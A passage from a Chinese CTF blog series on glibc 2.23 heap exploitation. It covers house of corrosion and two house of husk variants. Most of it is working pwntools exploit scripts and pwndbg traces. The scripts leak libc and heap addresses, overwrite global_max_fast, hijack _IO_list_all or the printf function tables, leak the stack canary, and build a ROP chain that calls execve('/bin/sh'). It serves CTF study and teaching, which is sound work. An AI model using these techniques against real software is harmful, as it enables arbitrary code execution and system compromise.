---
layout: post
title: 【pwn4heap】pwn4heap - glibc2.23其五
categories: pwn4heap
description: 深入解析 glibc2.23 Heap Technique
keywords: CTF, pwn4heap, glibc2.23
---

# pwn4heap - glibc2.23其五

在CTF竞赛体系中，pwn类题目因其直接关联底层系统安全机制，常被视为核心挑战方向。其中，堆利用技术涉及动态内存管理的复杂交互，是突破现代软件防御体系的关键路径之一。本系列聚焦于glibc 2.23环境下的堆漏洞利用方法，该版本因其广泛存在与典型性，成为相关研究的常见基础。通过系统分析与归纳，本系列整理出约43种利用技术，涵盖从基础结构破坏到高级组合利用的多种场景，旨在为后续学习、教学与实践提供结构化的参考。笔者期望借此推动该领域的技术积累与方法论沉淀，促进安全研究社区的交流与进步。


## 1. glibc2.23

### 1-21 house of corrosion

本方法利用glibc对于main_arena->fastbinsY数组管理缺陷而实现恶意操作。相关glibc完整源码参见[malloc.c](https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L3925)

```c
if ((unsigned long)(size) <= (unsigned long)(get_max_fast ())

#if TRIM_FASTBINS
    /*
	If TRIM_FASTBINS set, don't place chunks
	bordering top into fastbins
    */
    && (chunk_at_offset(p, size) != av->top)
#endif
    ) {

  if (__builtin_expect (chunk_at_offset (p, size)->size <= 2 * SIZE_SZ, 0)
	|| __builtin_expect (chunksize (chunk_at_offset (p, size))
			     >= av->system_mem, 0))
    {
	/* We might not have a lock at this point and concurrent modifications
	   of system_mem might have let to a false positive.  Redo the test
	   after getting the lock.  */
	if (have_lock
	    || ({ assert (locked == 0);
		  mutex_lock(&av->mutex);
		  locked = 1;
		  chunk_at_offset (p, size)->size <= 2 * SIZE_SZ
		    || chunksize (chunk_at_offset (p, size)) >= av->system_mem;
	      }))
	  {
	    errstr = "free(): invalid next size (fast)";
	    goto errout;
	  }
	if (! have_lock)
	  {
	    (void)mutex_unlock(&av->mutex);
	    locked = 0;
	  }
    }

  free_perturb (chunk2mem(p), size - 2 * SIZE_SZ);

  set_fastchunks(av);
  unsigned int idx = fastbin_index(size);
  fb = &fastbin (av, idx);

#define fastbin(ar_ptr, idx) ((ar_ptr)->fastbinsY[idx])

/* offset 2 to use otherwise unindexable first 2 bins */
#define fastbin_index(sz) \
  ((((unsigned int) (sz)) >> (SIZE_SZ == 8 ? 4 : 3)) - 2)
```

在glibc 2.23版本中，fastbin_index提取操作存在验证机制缺陷，具体表现为基本上未对size做任何限制。通过精心构造的size，致使`((ar_ptr)->fastbinsY[idx])`偏移覆盖任意地址，使其具备危害巨大的能力。

测试的二进制源码参考[binary.c](https://github.com/BinRacer/pwn4heap/tree/master/src/2.23/binary/11/binary.c)，相关exoloit.py完整内容可见[exploit.py](https://github.com/BinRacer/pwn4heap/blob/master/src/2.23/house_of_corrosion/exploit.py)。

核心利用代码如下：

```python
conn.sendafter(b"Enter author name: ", b"A" * 0x8)
conn.sendafter(b"Enter introduction: ", b"A" * 0x8)
# unsorted bin leak
malloc(0, 0xF8, b"A" * 0x8)
malloc(1, 0x18, b"B" * 0x8)
malloc(2, 0xF8, b"C" * 0x8)
malloc(3, 0x18, b"D" * 0x8)
delete(0)
delete(2)
author_name, introduction, content = show(0)
main_arena88 = u64(content[:6].ljust(8, b"\x00"))
log.info(f"main_arena+88: {hex(main_arena88)}")
libc.address = main_arena88 - 0x38DB78
log.info(f"libc base: {hex(libc.address)}")
log.info(f"system addr: {hex(libc.sym['system'])}")
log.info(f"global_max_fast addr: {hex(libc.sym['global_max_fast'])}")
fastbinsY = libc.sym["main_arena"] + 0x8
log.info(f"fastbinsY addr: {hex(fastbinsY)}")
_IO_list_all = libc.sym["_IO_list_all"]
log.info(f"_IO_list_all addr: {hex(_IO_list_all)}")
binsh_addr = next(libc.search(b"/bin/sh"))
log.info(f"binsh addr: {hex(binsh_addr)}")

# leak heap addr
edit(0, 0x8, b"A" * 0x8)
author_name, introduction, content = show(0)
chunk2_addr = u64(content[8 : 8 + 6].ljust(8, b"\x00"))
chunk0_addr = chunk2_addr - 0x100 - 0x20
log.info(f"chunk2 addr: {hex(chunk2_addr)}")
log.info(f"chunk0 addr: {hex(chunk0_addr)}")
edit(0, 0x8, p64(main_arena88))
malloc(0, 0xF8, b"A" * 0x8)
malloc(2, 0xF8, b"C" * 0x8)

# house of corrosion
#
# formula: size = (delta * 2) + 0x20 - 0x10
evil_size = (_IO_list_all - fastbinsY) * 2 + 0x20 - 0x10
malloc(4, evil_size, b"E" * 0x8)
malloc(5, 0x60, b"F" * 0x8)
delete(0)
payload = p64(main_arena88) + p64(libc.sym["global_max_fast"] - 0x10)
edit(0, len(payload), payload)
malloc(0, 0xF8, b"A" * 0x8)
delete(4)
edit(4, 0x8, p64(chunk2_addr + 0x10))
malloc(4, evil_size, b"\x00")

# house of orange
fake_io = flat({0x00: b"/bin/sh\x00", 0x20: p64(2), 0x28: p64(3), 0xC0: p64(0), 0xD8: p64(chunk0_addr + 0x10)})
edit(2, len(fake_io), fake_io)
fake_vtable = p64(libc.sym["system"]) * 4
edit(0, len(fake_vtable), fake_vtable)
conn.sendlineafter(b"> ", b"1")
conn.sendlineafter(b"Please input the chunk index: ", b"6")
conn.sendlineafter(b"Please input the size: ", b"16")
conn.recvline()
cmd = b"cat src/2.23/house_of_corrosion/flag\x00"
conn.sendline(cmd)
flag = conn.recvline().decode().strip()
log.success(f"flag: {format_flag(flag)}")
```

本测试二进制使用了unsorted bin leak + unsorted bin attack + house of corrosion + house of orange四个组合技。先利用unsorted bin leak技术泄露libc地址和heap地址，为后续利用做好基础准备。

```bash
pwndbg> heap
Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x600da0a3a000
Size: 0x100 (with flag bits: 0x101)
fd: 0x7da76ed8db78
bk: 0x600da0a3a120

Allocated chunk
Addr: 0x600da0a3a100
Size: 0x20 (with flag bits: 0x20)

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x600da0a3a120
Size: 0x100 (with flag bits: 0x101)
fd: 0x600da0a3a000
bk: 0x7da76ed8db78

Allocated chunk
Addr: 0x600da0a3a220
Size: 0x20 (with flag bits: 0x20)

Top chunk | PREV_INUSE
Addr: 0x600da0a3a240
Size: 0x20dc0 (with flag bits: 0x20dc1)

pwndbg> unsortedbin 
unsortedbin
all: 0x600da0a3a120 —▸ 0x600da0a3a000 —▸ 0x7da76ed8db78 (main_arena+88) ◂— 0x600da0a3a120
pwndbg> 
```

然后，使用公式`evil_size = (delta * 2) + 0x20 - 0x10`计算特制的evil_size，为后来的house of corrosion打下基础。

```bash
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x600da0a3a000
Size: 0x100 (with flag bits: 0x101)

Allocated chunk | PREV_INUSE
Addr: 0x600da0a3a100
Size: 0x20 (with flag bits: 0x21)

Allocated chunk | PREV_INUSE
Addr: 0x600da0a3a120
Size: 0x100 (with flag bits: 0x101)

Allocated chunk | PREV_INUSE
Addr: 0x600da0a3a220
Size: 0x20 (with flag bits: 0x21)

Allocated chunk | PREV_INUSE
Addr: 0x600da0a3a240
Size: 0x1450 (with flag bits: 0x1451)  <= evil_size

Top chunk | PREV_INUSE
Addr: 0x600da0a3b690
Size: 0x1f970 (with flag bits: 0x1f971)

pwndbg> 
```

接着，使用unsorted bin attack技术修改global_max_fast全局变量值，移除`if ((unsigned long)(size) <= (unsigned long)(get_max_fast ())`条件的限制。

```bash
pwndbg> unsortedbin 
unsortedbin
all [corrupted]
FD: 0x600da0a3a000 —▸ 0x7da76ed8db78 (main_arena+88) ◂— 0x600da0a3a000
BK: 0x600da0a3a000 —▸ 0x7da76ed8f7c8 (__free_hook) ◂— 0
pwndbg> x/4gx 0x600da0a3a000
0x600da0a3a000: 0x0000000000000000      0x0000000000000101
0x600da0a3a010: 0x00007da76ed8db78      0x00007da76ed8f7c8
pwndbg> x/1gx &global_max_fast 
0x7da76ed8f7d8 <global_max_fast>:       0x0000000000000080
pwndbg> 
```

申请chunks[0]触发unsorted bin attack。

```bash
pwndbg> x/1gx &global_max_fast 
0x7da76ed8f7d8 <global_max_fast>:       0x00007da76ed8db78
pwndbg> 
```

可以发现global_max_fast已经成功增大其限制。接下来释放chunks[4]即evil_size的chunk，触发house of corrosion。

```bash
In file: /home/bogon/workSpaces/glibc/malloc/malloc.c:3886
   3880 
   3881   /*
   3882     If eligible, place chunk on a fastbin so it can be found
   3883     and used quickly in malloc.
   3884   */
   3885 
 ► 3886   if ((unsigned long)(size) <= (unsigned long)(get_max_fast ())
   3887 
   3888 #if TRIM_FASTBINS
   3889       /*
   3890         If TRIM_FASTBINS set, don't place chunks
   3891         bordering top into fastbins
   3892       */
   3893       && (chunk_at_offset(p, size) != av->top)
 
pwndbg> p/x size
$1 = 0x1450
pwndbg> p/x global_max_fast 
$2 = 0x7da76ed8db78
pwndbg> 
```

正常情况下，chunks[4]是无法进入该分支条件，由于前面的unsorted bin attack辅助之下，最终可以顺利进入该fast bin相关分支。

```bash
In file: /home/bogon/workSpaces/glibc/malloc/malloc.c:3922
   3916           {
   3917             (void)mutex_unlock(&av->mutex);
   3918             locked = 0;
   3919           }
   3920       }
   3921 
 ► 3922     free_perturb (chunk2mem(p), size - 2 * SIZE_SZ);
```

毫无悬念地通过`__builtin_expect (chunk_at_offset (p, size)->size <= 2 * SIZE_SZ, 0)`和`__builtin_expect (chunksize (chunk_at_offset (p, size)) >= av->system_mem, 0)`二者校验，准备进入提取fast bin阶段。

```bash
In file: /home/bogon/workSpaces/glibc/malloc/malloc.c:3926
   3920       }
   3921 
   3922     free_perturb (chunk2mem(p), size - 2 * SIZE_SZ);
   3923 
   3924     set_fastchunks(av);
   3925     unsigned int idx = fastbin_index(size);
 ► 3926     fb = &fastbin (av, idx);
   3927 
   3928     /* Atomically link P to its fastbin: P->FD = *FB; *FB = P;  */
   3929     mchunkptr old = *fb, old2;
   3930     unsigned int old_idx = ~0u;
   3931     do
   3932       {
   3933         /* Check that the top of the bin is not the record we are going to add
 
pwndbg> p/x size
$3 = 0x1450
pwndbg> p/x (0x1450>>4)-2
$4 = 0x143
pwndbg> p/x idx
$5 = 0x143
pwndbg> p/x &main_arena->fastbinsY[0x143]
$6 = 0x7da76ed8e540
pwndbg> x/1gx 0x7da76ed8e540
0x7da76ed8e540 <__GI__IO_list_all>:     0x00007da76ed8e560
pwndbg> 
```

可以发现通过evil_size，main_arena->fastbinsY[0x143]成功指向_IO_list_all，接着进入`while ((old = catomic_compare_and_exchange_val_rel (fb, p, old2)) != old2);`循环。


```bash
In file: /home/bogon/workSpaces/glibc/malloc/malloc.c:3948
   3942            only if we have the lock, otherwise it might have already been
   3943            deallocated.  See use of OLD_IDX below for the actual check.  */
   3944         if (have_lock && old != NULL)
   3945           old_idx = fastbin_index(chunksize(old));
   3946         p->fd = old2 = old;
   3947       }
 ► 3948     while ((old = catomic_compare_and_exchange_val_rel (fb, p, old2)) != old2);
 
pwndbg> x/1gx &_IO_list_all
0x7da76ed8e540 <__GI__IO_list_all>:     0x0000600da0a3a240
pwndbg> p/x chunks[4]
$7 = {
  size = 0x1440,
  addr = 0x600da0a3a250
}
pwndbg> x/4gx 0x600da0a3a250-0x10
0x600da0a3a240: 0x0000000000000000      0x0000000000001451
0x600da0a3a250: 0x00007da76ed8e560      0x0000000000000000
pwndbg> 
```

循环结束时，可以发现_IO_list_all内容已经修改为chunks[4]即0x0000600da0a3a240。

```bash
pwndbg> x/4gx 0x600da0a3a250-0x10
0x600da0a3a240: 0x0000000000000000      0x0000000000001451
0x600da0a3a250: 0x0000600da0a3a130      0x0000000000000000
pwndbg> 
```

此时，申请evil_size大小内存，触发house of orange的第二种写原语。前面的free触发的第一种写原语。

```bash
In file: /home/bogon/workSpaces/glibc/malloc/malloc.c:3372
   3366    */
   3367 
   3368   if ((unsigned long) (nb) <= (unsigned long) (get_max_fast ()))
   3369     {
   3370       idx = fastbin_index (nb);
   3371       mfastbinptr *fb = &fastbin (av, idx);
 ► 3372       mchunkptr pp = *fb;
   3373       do
   3374         {
   3375           victim = pp;
   3376           if (victim == NULL)
   3377             break;
   3378         }
   3379       while ((pp = catomic_compare_and_exchange_val_acq (fb, victim->fd, victim))
   
pwndbg> p/x fb
$9 = 0x7da76ed8e540
pwndbg> x/1gx fb
0x7da76ed8e540 <__GI__IO_list_all>:     0x0000600da0a3a240
pwndbg> 
```

准备修改_IO_list_all修改内容。

```bash
In file: /home/bogon/workSpaces/glibc/malloc/malloc.c:3380
   3374         {
   3375           victim = pp;
   3376           if (victim == NULL)
   3377             break;
   3378         }
   3379       while ((pp = catomic_compare_and_exchange_val_acq (fb, victim->fd, victim))
 ► 3380              != victim);
   3381       if (victim != 0)
   
pwndbg> x/1gx &_IO_list_all
0x7da76ed8e540 <__GI__IO_list_all>:     0x0000600da0a3a130
pwndbg> p/x victim
$10 = 0x600da0a3a240
pwndbg> 
```

可以发现_IO_list_all已经成功将其从0x0000600da0a3a240修改为0x0000600da0a3a130，并将victim返回用户。

```bash
pwndbg> x/10gx chunks
0x600d877c10c0 <chunks>:        0x00000000000000f8      0x0000600da0a3a010
0x600d877c10d0 <chunks+16>:     0x0000000000000018      0x0000600da0a3a110
0x600d877c10e0 <chunks+32>:     0x00000000000000f8      0x0000600da0a3a130
0x600d877c10f0 <chunks+48>:     0x0000000000000018      0x0000600da0a3a230
0x600d877c1100 <chunks+64>:     0x0000000000001440      0x0000600da0a3a250
pwndbg> 
```


目前_IO_list_all指向的chunks[2], 准备fake io结构在chunks[0]和chunks[2]上，进而实现house of orange。

```bash
pwndbg> p/x *_IO_list_all
$12 = {
  file = {
    _flags = 0x6e69622f,
    _IO_read_ptr = 0x6161616461616163,
    _IO_read_end = 0x6161616661616165,
    _IO_read_base = 0x6161616861616167,
    _IO_write_base = 0x2,
    _IO_write_ptr = 0x3,
    _IO_write_end = 0x6161616e6161616d,
    _IO_buf_base = 0x616161706161616f,
    _IO_buf_end = 0x6161617261616171,
    _IO_save_base = 0x6161617461616173,
    _IO_backup_base = 0x6161617661616175,
    _IO_save_end = 0x6161617861616177,
    _markers = 0x6261617a61616179,
    _chain = 0x6261616362616162,
    _fileno = 0x62616164,
    _flags2 = 0x62616165,
    _old_offset = 0x6261616762616166,
    _cur_column = 0x6168,
    _vtable_offset = 0x61,
    _shortbuf = {0x62},
    _lock = 0x6261616b6261616a,
    _offset = 0x6261616d6261616c,
    _codecvt = 0x6261616f6261616e,
    _wide_data = 0x6261617162616170,
    _freeres_list = 0x6261617362616172,
    _freeres_buf = 0x6261617562616174,
    __pad5 = 0x6261617762616176,
    _mode = 0x0,
    _unused2 = {0x0, 0x0, 0x0, 0x0, 0x7a, 0x61, 0x61, 0x63, 0x62, 0x61, 0x61, 0x63, 0x63, 0x61, 0x61, 0x63, 0x64, 0x61, 0x61, 0x63}
  },
  vtable = 0x600da0a3a010
}
pwndbg> p/x *_IO_list_all.vtable
$13 = {
  __dummy = 0x7da76ea3c3eb,
  __dummy2 = 0x7da76ea3c3eb,
  __finish = 0x7da76ea3c3eb,
  __overflow = 0x7da76ea3c3eb,
  __underflow = 0x0,
  __uflow = 0x0,
  __pbackfail = 0x0,
  __xsputn = 0x0,
  __xsgetn = 0x0,
  __seekoff = 0x0,
  __seekpos = 0x0,
  __setbuf = 0x0,
  __sync = 0x0,
  __doallocate = 0x0,
  __read = 0x0,
  __write = 0x0,
  __seek = 0x0,
  __close = 0x0,
  __stat = 0x0,
  __showmanyc = 0x0,
  __imbue = 0x0
}
pwndbg> 
```

任意申请一次内存，触发malloc_printerr。

```bash
In file: /home/bogon/workSpaces/glibc/malloc/malloc.c:3475
   3469       int iters = 0;
   3470       while ((victim = unsorted_chunks (av)->bk) != unsorted_chunks (av))
   3471         {
   3472           bck = victim->bk;
   3473           if (__builtin_expect (victim->size <= 2 * SIZE_SZ, 0)
   3474               || __builtin_expect (victim->size > av->system_mem, 0))
 ► 3475             malloc_printerr (check_action, "malloc(): memory corruption",
   3476                              chunk2mem (victim), av);
```

进而进入_IO_flush_all_lockp函数，触发_IO_OVERFLOW函数。

```bash
In file: /home/bogon/workSpaces/glibc/libio/genops.c:786
   780 #if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T
   781            || (_IO_vtable_offset (fp) == 0
   782                && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr
   783                                     > fp->_wide_data->_IO_write_base))
   784 #endif
   785            )
 ► 786           && _IO_OVERFLOW (fp, EOF) == EOF)
 
pwndbg> x/s fp
0x600da0a3a130: "/bin/sh"
pwndbg> 
```

获取shell控制权近在眼前了。


### 1-22 house of husk其一

本方法使用`size = (delta * 2) + 0x20 - 0x10`的公式，与前面的house of corrosion技术是一致的。不过，本方法通过利用`__printf_function_table`和`__printf_arginfo_table`特性实现shell的控制权。

在libc中，用户可以自定义输入输出控制符，包括重定义以及新增控制符等，此技术极大的丰富了IO函数的表达能力，而`__printf_function_table`和`__printf_arginfo_table`实现的核心，当`__printf_function_table`内容不为空时，执行`__printf_arginfo_table`指向的函数指针数组里的自定义函数指针。

测试的二进制源码参考[binary.c](https://github.com/BinRacer/pwn4heap/tree/master/src/2.23/binary/13/binary.c)，相关exoloit.py完整内容可见[exploit.py](https://github.com/BinRacer/pwn4heap/blob/master/src/2.23/house_of_husk/exploit.py)。

核心利用代码如下：

```python
FASTBIN_Y = libc.symbols["main_arena"] + 0x8
GLOBAL_MAX_FAST = libc.symbols["global_max_fast"]
PRINTF_FUNCTABLE = libc.symbols["__printf_function_table"]
PRINTF_ARGINFO = libc.symbols["__printf_arginfo_table"]

# house_of_husk
conn.sendafter(b"Enter author name: ", b"A" * 0x8)
conn.sendafter(b"Enter introduction: ", b"A" * 0x8)
magic = use_magic()
malloc(0, 0x500, b"A" * 0x8)
malloc(1, offset2size(PRINTF_FUNCTABLE - FASTBIN_Y), b"B" * 0x8)
malloc(2, offset2size(PRINTF_ARGINFO - FASTBIN_Y), b"C" * 0x8)
malloc(3, 0x500, b"D" * 0x8)
delete(0)
author_name, introduction, content = show(0)
main_arena88 = u64(content[:6].ljust(8, b"\x00"))
log.info(f"main_arena+88: {hex(main_arena88)}")
libc.address = main_arena88 - 0x38DB78
main_arena = libc.sym["main_arena"]
fastbinsY = libc.sym["main_arena"] + 0x8
global_max_fast = libc.sym["global_max_fast"]
__printf_function_table = libc.sym["__printf_function_table"]
__printf_arginfo_table = libc.sym["__printf_arginfo_table"]
# Due to the complexities associated with satisfying one-gadget constraints in specific libc environments,
# I opt for the magic function as a more reliable alternative.
#
# one_gadget = libc.address + 0xCF70A
one_gadget = magic
log.info(f"libc base: {hex(libc.address)}")
log.info(f"main_arena addr: {hex(main_arena)}")
log.info(f"fastbinsY addr: {hex(fastbinsY)}")
log.info(f"global_max_fast addr: {hex(global_max_fast)}")
log.info(f"__printf_function_table addr: {hex(__printf_function_table)}")
log.info(f"__printf_arginfo_table addr: {hex(__printf_arginfo_table)}")
log.info(f"one_gadget addr: {hex(one_gadget)}")

payload = b"\x00" * (ord("s") - 2) * 8 + p64(one_gadget)
edit(2, len(payload), payload)
payload = p64(main_arena88) + p64(global_max_fast - 0x10)
edit(0, len(payload), payload)
malloc(0, 0x500, b"A" * 0x8)
delete(1)
delete(2)
conn.sendlineafter(b"> ", b"4")
cmd = b"cat src/2.23/house_of_husk/flag\x00"
conn.sendline(cmd)
flag = conn.recvline().decode().strip()
log.success(f"flag: {format_flag(flag)}")
```

连续申请chunks[0]、chunks[1]、chunks[2]、chunks[3]内存，其中chunks[1]和chunks[2]使用公式计算特制的size来申请。

```bash
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x5ac809cf3000
Size: 0x510 (with flag bits: 0x511)

Allocated chunk | PREV_INUSE
Addr: 0x5ac809cf3510
Size: 0x9360 (with flag bits: 0x9361)

Allocated chunk | PREV_INUSE
Addr: 0x5ac809cfc870
Size: 0x1870 (with flag bits: 0x1871)

Allocated chunk | PREV_INUSE
Addr: 0x5ac809cfe0e0
Size: 0x510 (with flag bits: 0x511)

Top chunk | PREV_INUSE
Addr: 0x5ac809cfe5f0
Size: 0x15a10 (with flag bits: 0x15a11)

pwndbg> 
```

然后，释放chunks[0]至unsorted bin。用来泄露libc地址，为后续利用做好基础。

```bash
pwndbg> unsortedbin 
unsortedbin
all: 0x5ac809cf3000 —▸ 0x77292d58db78 (main_arena+88) ◂— 0x5ac809cf3000
pwndbg> 
```

此次利用的控制符为`%s`，在chunks[2]内布局__printf_arginfo_table函数指针数组。

```bash
pwndbg> x/1gx 0x5ac809cfc880-0x10+115*8
0x5ac809cfcc08: 0x00005ac7eae2b8d5  <= one_gadget
pwndbg> 
```

准备利用unsorted bin attack技术，修改global_max_fast的限制。

```bash
pwndbg> unsortedbin 
unsortedbin
all [corrupted]
FD: 0x5ac809cf3000 —▸ 0x77292d58db78 (main_arena+88) ◂— 0x5ac809cf3000
BK: 0x5ac809cf3000 —▸ 0x77292d58f7c8 (__free_hook) ◂— 0
pwndbg> x/4gx 0x5ac809cf3000
0x5ac809cf3000: 0x0000000000000000      0x0000000000000511
0x5ac809cf3010: 0x000077292d58db78      0x000077292d58f7c8
pwndbg> x/1gx &global_max_fast 
0x77292d58f7d8 <global_max_fast>:       0x0000000000000080
pwndbg> 
```

申请chunks[0]内存，触发unsorted bin attack。

```bash
pwndbg> x/1gx &global_max_fast 
0x77292d58f7d8 <global_max_fast>:       0x000077292d58db78
pwndbg> x/1gx &__printf_function_table
0x77292d5924c8 <__printf_function_table>:       0x0000000000000000
pwndbg> x/1gx &__printf_arginfo_table
0x77292d58e750 <__printf_arginfo_table>:        0x0000000000000000
pwndbg> 
```

可以发现成功修改。释放chunks[1]修改__printf_function_table内容，释放chunks[2]修改__printf_arginfo_table内容。

```bash
pwndbg> x/1gx &__printf_function_table
0x77292d5924c8 <__printf_function_table>:       0x00005ac809cf3510
pwndbg> x/1gx &__printf_arginfo_table
0x77292d58e750 <__printf_arginfo_table>:        0x00005ac809cfc870
pwndbg> x/1gx 0x5ac809cfc870+115*8
0x5ac809cfcc08: 0x00005ac7eae2b8d5 <= one_gadget
pwndbg> 
```

触发包含`%s`的输出函数，进入[vfprintf](https://elixir.bootlin.com/glibc/glibc-2.23/source/stdio-common/vfprintf.c#L1328)。

```bash
In file: /home/bogon/workSpaces/glibc/stdio-common/vfprintf.c:1328
   1322 
   1323   /* If we only have to print a simple string, return now.  */
   1324   if (*f == L_('\0'))
   1325     goto all_done;
   1326 
   1327   /* Use the slow path in case any printf handler is registered.  */
 ► 1328   if (__glibc_unlikely (__printf_function_table != NULL
   1329                         || __printf_modifier_table != NULL
   1330                         || __printf_va_arg_table != NULL))
   1331     goto do_positional;
   1332 
```

此时，满足__printf_function_table != NULL条件，进入do_positional。

```c
/* The function itself.  */
int
vfprintf (FILE *s, const CHAR_T *format, va_list ap)
{
...
/* Hand off processing for positional parameters.  */
do_positional:
if (__glibc_unlikely (workstart != NULL))
  {
    free (workstart);
    workstart = NULL;
  }
done = printf_positional (s, format, readonly_format, ap, &ap_save,
			    done, nspecs_done, lead_str_end, work_buffer,
			    save_errno, grouping, thousands_sep);

all_done:
if (__glibc_unlikely (workstart != NULL))
  free (workstart);
/* Unlock the stream.  */
_IO_funlockfile (s);
_IO_cleanup_region_end (0);

return done;
}
```

接着进入printf_positional函数。

```c
static int
printf_positional (_IO_FILE *s, const CHAR_T *format, int readonly_format,
		   va_list ap, va_list *ap_savep, int done, int nspecs_done,
		   const UCHAR_T *lead_str_end,
		   CHAR_T *work_buffer, int save_errno,
		   const char *grouping, THOUSANDS_SEP_T thousands_sep)
{
...
      /* Parse the format specifier.  */
#ifdef COMPILE_WPRINTF
      nargs += __parse_one_specwc (f, nargs, &specs[nspecs], &max_ref_arg);
#else
      nargs += __parse_one_specmb (f, nargs, &specs[nspecs], &max_ref_arg);
#endif
    }
```

再进入__parse_one_specmb函数。
   
```bash
In file: /home/bogon/workSpaces/glibc/stdio-common/printf-parsemb.c:315
   309   if (__builtin_expect (__printf_function_table == NULL, 1)
   310       || spec->info.spec > UCHAR_MAX
   311       || __printf_arginfo_table[spec->info.spec] == NULL
   312       /* We don't try to get the types for all arguments if the format
   313          uses more than one.  The normal case is covered though.  If
   314          the call returns -1 we continue with the normal specifiers.  */
 ► 315       || (int) (spec->ndata_args = (*__printf_arginfo_table[spec->info.spec])
   316                                    (&spec->info, 1, &spec->data_arg_type,
   317                                     &spec->size)) < 0)
   318     {
   319       /* Find the data argument types of a built-in spec.  */
   320       spec->ndata_args = 1;
   321 
   322       switch (spec->info.spec)
   
pwndbg> p/x spec->info.spec
$3 = 0x73
pwndbg> p/x __printf_arginfo_table[spec->info.spec]
$4 = 0x5ac7eae2b8d5
pwndbg> x/6i 0x5ac7eae2b8d5
   0x5ac7eae2b8d5 <magic>:      endbr64
   0x5ac7eae2b8d9 <magic+4>:    push   rbp
   0x5ac7eae2b8da <magic+5>:    mov    rbp,rsp
   0x5ac7eae2b8dd <magic+8>:    lea    rax,[rip+0x86f]        # 0x5ac7eae2c153
   0x5ac7eae2b8e4 <magic+15>:   mov    rdi,rax
   0x5ac7eae2b8e7 <magic+18>:   call   0x5ac7eae2b180 <system@plt>
pwndbg> 
```

使用one_gadget获取shell的控制权轻而易举。


### 1-23 house of husk其二

本方法使用`size = (delta * 2) + 0x20 - 0x10`的公式，与前面的house of corrosion技术是一致的。不过，本方法通过利用`__environ`修改stack上内容，实现shell的控制权。

测试的二进制源码参考[binary.c](https://github.com/BinRacer/pwn4heap/tree/master/src/2.23/binary/14/binary.c)，相关exoloit.py完整内容可见[exploit.py](https://github.com/BinRacer/pwn4heap/blob/master/src/2.23/house_of_husk_again/exploit.py)。

核心利用代码如下：

```python
FASTBIN_Y = libc.symbols["main_arena"] + 0x8
GLOBAL_MAX_FAST = libc.symbols["global_max_fast"]
ENVIRON = libc.symbols["__environ"]

# house of husk
fake_size = (offset2size(ENVIRON - FASTBIN_Y) + 0x10) | 1
conn.sendafter(b"Enter author name: ", p64(fake_size))
log.info(f"fake size: {hex(fake_size)}")
malloc(0, 0x500)
malloc(1, offset2size(ENVIRON - FASTBIN_Y))
malloc(2, 0x500)
delete(0)
content = show(0)
main_arena88 = u64(content[:6].ljust(8, b"\x00"))
log.info(f"main_arena+88: {hex(main_arena88)}")
libc.address = main_arena88 - 0x38DB78
main_arena = libc.sym["main_arena"]
fastbinsY = libc.sym["main_arena"] + 0x8
global_max_fast = libc.sym["global_max_fast"]
__environ = libc.sym["__environ"]
pop_rdi = libc.address + 0x00000000000202F1
pop_rsi = libc.address + 0x000000000001FEE3
pop_rdx = libc.address + 0x0000000000001B92
execve_addr = libc.sym["execve"]
log.info(f"libc base: {hex(libc.address)}")
log.info(f"main_arena addr: {hex(main_arena)}")
log.info(f"fastbinsY addr: {hex(fastbinsY)}")
log.info(f"global_max_fast addr: {hex(global_max_fast)}")
log.info(f"__environ addr: {hex(__environ)}")
log.info(f"pop_rdi addr: {hex(pop_rdi)}")
log.info(f"pop_rsi addr: {hex(pop_rsi)}")
log.info(f"pop_rdx addr: {hex(pop_rdx)}")
log.info(f"execve_addr addr: {hex(execve_addr)}")
binsh_addr = next(libc.search(b"/bin/sh"))
log.info(f"binsh addr: {hex(binsh_addr)}")

payload = p64(main_arena88) + p64(global_max_fast - 0x10)
edit(0, len(payload), payload)
malloc(0, 0x500)
delete(1)
content = show(1)
env_addr = u64(content[:6].ljust(8, b"\x00"))
log.info(f"env addr: {hex(env_addr)}")

fake_chunk_addr = env_addr - 0x130
edit(1, 0x8, p64(fake_chunk_addr))
malloc(1, offset2size(ENVIRON - FASTBIN_Y))
malloc(3, offset2size(ENVIRON - FASTBIN_Y))

payload = b"A" * 0x20 + b"A" * 0x1
edit(3, len(payload), payload)
content = show(3)
canary = u64(content[0x21 : 0x21 + 8]) << 8
log.info(f"canary: {hex(canary)}")

canary = ctypes.c_uint64(canary).value
payload = b"A" * 0x20 + p64(canary) + p64(0)
payload += p64(pop_rdi)
payload += p64(binsh_addr)
payload += p64(pop_rsi)
payload += p64(0)
payload += p64(pop_rdx)
payload += p64(0)
payload += p64(execve_addr)
edit(3, len(payload), payload)

exit_proc()
conn.recvline()
cmd = b"cat src/2.23/house_of_husk_again/flag\x00"
conn.sendline(cmd)
flag = conn.recvline().decode().strip()
log.success(f"flag: {format_flag(flag)}")
```

首先，连续申请chunks[0]、chunks[1]、chunks[2]内存，其中chunks[1]采用公式计算出来特制的evil_size申请。

```bash
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x589ea29c5000
Size: 0x510 (with flag bits: 0x511)

Allocated chunk | PREV_INUSE
Addr: 0x589ea29c5510
Size: 0x4940 (with flag bits: 0x4941)

Allocated chunk | PREV_INUSE
Addr: 0x589ea29c9e50
Size: 0x510 (with flag bits: 0x511)

Top chunk | PREV_INUSE
Addr: 0x589ea29ca360
Size: 0x1bca0 (with flag bits: 0x1bca1)

pwndbg> 
```

然后，释放chunks[0]至unsorted bin，用来泄露libc地址。

```bash
pwndbg> unsortedbin 
unsortedbin
all: 0x589ea29c5000 —▸ 0x7db0f978db78 (main_arena+88) ◂— 0x589ea29c5000
pwndbg> 
```

准备利用unsorted bin attack技术修改global_max_fast限制。

```bash
pwndbg> unsortedbin 
unsortedbin
all [corrupted]
FD: 0x589ea29c5000 —▸ 0x7db0f978db78 (main_arena+88) ◂— 0x589ea29c5000
BK: 0x589ea29c5000 —▸ 0x7db0f978f7c8 (__free_hook) ◂— 0
pwndbg> x/4gx 0x589ea29c5000
0x589ea29c5000: 0x0000000000000000      0x0000000000000511
0x589ea29c5010: 0x00007db0f978db78      0x00007db0f978f7c8
pwndbg> x/1gx &global_max_fast 
0x7db0f978f7d8 <global_max_fast>:       0x0000000000000080
pwndbg> 
```

申请chunks[0]触发unsorted bin attack。
